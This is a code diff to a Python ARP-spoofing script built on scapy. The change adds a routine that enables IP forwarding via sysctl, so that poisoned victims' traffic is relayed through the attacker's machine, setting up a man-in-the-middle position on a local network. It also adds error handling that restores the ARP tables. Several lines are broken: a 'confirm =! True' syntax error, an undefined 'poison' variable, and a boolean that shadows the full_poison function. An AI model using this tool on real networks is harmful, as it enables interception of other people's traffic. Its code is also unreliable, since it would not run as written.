@@ -1,5 +1,6 @@
 from time import sleep
 from sys import argv
+from subprocess import call
 
 from scapy.all import send, ARP
 
@@ -11,6 +12,7 @@ sleep_iter = 3
 
 def partial_poison(Victim):
     op_code = 1
+    pass_traffic(True)
     send(ARP(op = op_code, psrc=Victim.ipv4, hwdst=Victim.mac))
     sleep(sleep_iter)
 
@@ -26,19 +28,33 @@ def restore(Victim, Gateway):
 
     send(ARP(op = op_code, pdst = Gateway.ipv4, psrc = Victim.ipv4, hwdst = mac_addr, hwsrc = Victim.mac), count = 4)
     send(ARP(op = op_code, pdst = Victim.ipv4, psrc = Gateway.ipv4, hwdst = mac_addr, hwsrc = Gateway.mac), count = 4)
+    pass_traffic(False)
 
 def spoof_all(victim_list, full_poison = False):
-    if full_poison == True:
-        Gateway = make_target(get_gateway())
-        while 1: [full_poison(Victim, Gateway)for Victim in victim_list]
-    else: [partial_poison(poison) for Victim in victim_list]
-            
+    Gateway = make_target(get_gateway())
 
+    try:
+        pass_traffic(True)
+        if full_poison == True:
+            while 1: [full_poison(Victim, Gateway)for Victim in victim_list]
+        else: [partial_poison(poison) for Victim in victim_list]
+
+    except KeyboardInterrupt:
+        restore(victim_list, Gateway)
+    except Exception as E:
+        print(E)
+        pass_traffic(False)
     return
 
-def rely_tcp():
-    return
+def pass_traffic(confirm=True):
+    cmd = 'sysctl -w net.inet.ip.forwarding='
 
+    if confirm =! True: cmd = cmd + '0'
+    else: cmd = cmd + '1'
+
+    call(cmd)#, shell=True)
+
+    return 
 
 if __name__ == '__main__':
     #pass in the ip_address of the target you wish to poison 
